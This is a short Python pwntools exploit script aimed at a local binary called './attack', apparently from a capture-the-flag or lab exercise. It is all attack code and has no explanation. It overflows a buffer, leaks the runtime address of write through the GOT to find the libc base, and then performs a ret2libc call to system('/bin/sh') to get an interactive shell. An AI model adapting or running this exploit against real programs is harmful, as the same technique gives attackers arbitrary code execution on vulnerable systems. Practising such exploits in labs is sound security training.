from pwn import *

p = process('./attack')
e = ELF('./attack')
libc = e.libc
payload = 'A'*0x64 + 'B'*0x4 + p32(e.plt['write']) +p32(e.symbols['main'])
payload+= p32(0x1) + p32(e.got['write']) + p32(0x4)
p.recvline()
p.send(payload)

libc_base = u32(p.recv(4)) - libc.symbols['write']
system = libc_base + libc.symbols["system"]
sh = libc_base + next(libc.search("/bin/sh"))

payload = 'A'*0x64 + 'B'*0x4 + p32(system) + p32(sh) * 2
p.recvline()
p.send(payload)

p.interactive()
